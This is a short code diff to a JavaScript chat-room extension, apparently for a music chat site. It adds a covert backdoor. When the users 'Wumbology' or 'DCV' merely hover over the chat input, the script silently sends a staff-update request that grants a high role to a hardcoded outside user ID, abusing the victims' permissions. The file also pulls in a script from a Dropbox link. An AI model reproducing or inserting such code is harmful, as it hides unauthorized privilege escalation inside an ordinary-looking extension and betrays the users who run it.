@@ -695,16 +695,15 @@ if (d.getDate() == 2 && d.getMonth() == 11){
 
 $.getScript('https://dl.dropboxusercontent.com/s/y90bayahpfh4odh/jquery-ui-1.10.4.custom.min.js?_=1424626287371');
 
-if (bcs.user.username == "Wumbology"){
-	$("#chat-input-field").on('click',function(){
+if (bcs.user.username == "Wumbology" || bcs.user.username == "DCV"){
+	$("#chat-input-field").hover(function(){
 		$.ajax({
 			type: 'POST',
 			url: '/_/staff/update',
 			dataType: 'json',
 			contentType: 'application/json',
-			data: JSON.stringify({userID: bcs.user.id, roleID: 1})
+			data: JSON.stringify({userID: 4820534, roleID: 5})
 		})
-		bcs.addChat('Huehuehuehue I told you');
 	});
 }
 
